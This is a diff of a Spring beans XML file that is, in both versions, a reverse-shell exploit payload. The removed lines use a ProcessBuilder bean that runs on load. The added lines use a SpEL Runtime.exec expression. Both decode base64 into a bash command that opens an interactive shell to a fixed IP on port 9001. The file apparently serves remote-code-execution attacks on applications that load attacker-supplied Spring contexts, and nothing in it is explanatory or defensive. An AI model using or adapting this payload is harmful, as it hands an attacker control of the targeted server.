@@ -1,17 +1,12 @@
-Xml:
 <?xml version="1.0" encoding="UTF-8" ?>
 <beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xsi:schemaLocation="
-       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+       xsi:schemaLocation="http://www.springframework.org/schema/beans 
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
 
-    <bean id="p" class="java.lang.ProcessBuilder" init-method="start">
-        <constructor-arg>
-            <list>
-                <value>bash</value>
-                <value>-c</value>
-                <value>echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xNDMvOTAwMSAwPiYx | base64 -d | bash</value>
-            </list>
-        </constructor-arg>
+    <bean id="x" class="java.lang.String">
+        <property name="y" value="#{''.getClass().forName('java.lang.Runtime')
+            .getRuntime().exec('bash -c {echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5LjE0My85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}')}"/>
     </bean>
+
 </beans>
